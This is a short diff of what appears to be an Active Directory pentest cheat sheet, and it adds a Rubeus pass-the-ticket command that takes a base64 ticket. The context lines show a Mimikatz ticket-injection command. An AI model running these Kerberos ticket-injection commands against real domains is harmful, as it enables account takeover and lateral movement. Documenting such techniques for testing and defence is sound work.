@@ -151,4 +151,5 @@ Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
 
 ```powershell
 .\Rubeus.exe ptt /ticket:ticket.kirbi
+.\Rubeus.exe ptt /ticket:<base64ticket>
 ```
